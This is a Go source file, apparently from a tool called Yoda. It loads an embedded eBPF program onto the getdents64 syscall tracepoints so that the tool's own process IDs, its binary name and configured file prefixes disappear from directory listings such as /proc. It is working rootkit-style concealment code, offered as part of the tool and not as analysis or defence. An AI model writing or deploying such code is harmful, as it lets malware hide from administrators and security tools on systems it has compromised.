// Package ebpf provides utilities to manage hidden PIDs and binary file via eBPF getdents hook.
package ebpf

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	cfg "github.com/cezamee/Yoda/internal/config"
	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

//go:embed obj/getdents.o
var getDentsObj []byte

const (
	BpfObjPath = "bpf/getdents.o"
	MaxHidden  = 16
	MaxNameLen = 100
)

type HiddenEntry struct {
	Name     [100]byte
	NameLen  int32
	IsPrefix uint8
}

// matchesBinary returns true if the process with pid matches the binary name (exe or cmdline)
func matchesBinary(pid int, binaryName string) bool {
	exePath := fmt.Sprintf("/proc/%d/exe", pid)
	target, err := os.Readlink(exePath)
	if err == nil && strings.Contains(target, binaryName) {
		return true
	}
	cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
	cmdlineBytes, err := os.ReadFile(cmdlinePath)
	return err == nil && strings.Contains(string(cmdlineBytes), binaryName)
}

// getYodaPIDs returns all PIDs of running processes whose executable matches the current binary name.
func getYodaPIDs() ([]int, error) {
	selfExe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return nil, fmt.Errorf("failed to read /proc/self/exe: %w", err)
	}
	binaryName := filepath.Base(selfExe)
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, fmt.Errorf("failed to list /proc: %w", err)
	}
	var pids []int
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}
		if matchesBinary(pid, binaryName) {
			pids = append(pids, pid)
		}
	}
	return pids, nil
}

// getBinaryName returns the basename of the current executable.
func getBinaryName() (string, error) {
	selfExe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return "", fmt.Errorf("failed to read /proc/self/exe: %w", err)
	}
	return filepath.Base(selfExe), nil
}

// loadGetdentsBPF loads the getdents.o eBPF object file and returns the collection.
func loadGetdentsBPF() (*ebpf.Collection, error) {
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(getDentsObj))
	if err != nil {
		return nil, fmt.Errorf("failed to load BPF spec: %w", err)
	}
	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return nil, fmt.Errorf("failed to create BPF collection: %w", err)
	}
	return coll, nil
}

// populateHiddenEntries populates the hidden_entries map with the given PIDs as strings.
// populateHiddenEntries ajoute les PIDs et le nom du binaire à la map hidden_entries.
func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) error {
	idx := 0
	for _, val := range append(pids, -1) {
		if idx >= MaxHidden {
			break
		}
		var entry HiddenEntry
		if val == -1 && binName != "" {
			copy(entry.Name[:], binName)
			entry.NameLen = int32(len(binName))
			entry.IsPrefix = 0
		} else if val != -1 {
			pidStr := strconv.Itoa(val)
			copy(entry.Name[:], pidStr)
			entry.NameLen = int32(len(pidStr))
			entry.IsPrefix = 0
		} else {
			continue
		}
		key := uint32(idx)
		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
			return fmt.Errorf("failed to update hidden_entries[%d]: %w", idx, err)
		}
		idx++
	}

	for _, prefix := range cfg.HiddenPrefixes {
		if idx >= MaxHidden {
			break
		}
		var entry HiddenEntry
		copy(entry.Name[:], prefix)
		entry.NameLen = int32(len(prefix))
		entry.IsPrefix = 1
		key := uint32(idx)
		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
			return fmt.Errorf("failed to update hidden_entries[prefix %s]: %w", prefix, err)
		}
		idx++
	}
	return nil
}

// HideOwnPIDs loads the BPF program and populates the hidden_entries map with this program's PIDs.
// Peut prendre des PIDs supplémentaires à cacher à chaud (extraPIDs...)
func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
	pids, err := getYodaPIDs()
	if err != nil {
		return nil, nil, err
	}
	mergedPIDs := mergeUniquePIDs(pids, extraPIDs)

	binName, err := getBinaryName()
	if err != nil {
		return nil, nil, err
	}
	coll, err := loadGetdentsBPF()
	if err != nil {
		return nil, nil, err
	}
	hiddenMap, ok := coll.Maps["hidden_entries"]
	if !ok {
		return nil, nil, fmt.Errorf("hidden_entries map not found in BPF object")
	}
	if err := populateHiddenEntries(hiddenMap, mergedPIDs, binName); err != nil {
		return nil, nil, err
	}

	enterProg, ok := coll.Programs["hook_getdents64_enter"]
	if !ok {
		return nil, nil, fmt.Errorf("hook_getdents64_enter program not found in BPF object")
	}
	exitProg, ok := coll.Programs["hook_getdents64_exit"]
	if !ok {
		return nil, nil, fmt.Errorf("hook_getdents64_exit program not found in BPF object")
	}
	enterLink, err = link.Tracepoint("syscalls", "sys_enter_getdents64", enterProg, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to attach sys_enter_getdents64: %w", err)
	}
	exitLink, err = link.Tracepoint("syscalls", "sys_exit_getdents64", exitProg, nil)
	if err != nil {
		enterLink.Close()
		return nil, nil, fmt.Errorf("failed to attach sys_exit_getdents64: %w", err)
	}
	fmt.Printf("👻 Hidden PIDs: %v\n\n", mergedPIDs)
	return enterLink, exitLink, nil

}

func mergeUniquePIDs(a, b []int) []int {
	pidSet := make(map[int]struct{}, len(a)+len(b))
	for _, pid := range a {
		pidSet[pid] = struct{}{}
	}
	for _, pid := range b {
		pidSet[pid] = struct{}{}
	}
	merged := make([]int, 0, len(pidSet))
	for pid := range pidSet {
		merged = append(merged, pid)
	}
	return merged
}

func CloseLinks(links ...link.Link) {
	for _, l := range links {
		if l != nil {
			_ = l.Close()
		}
	}
}
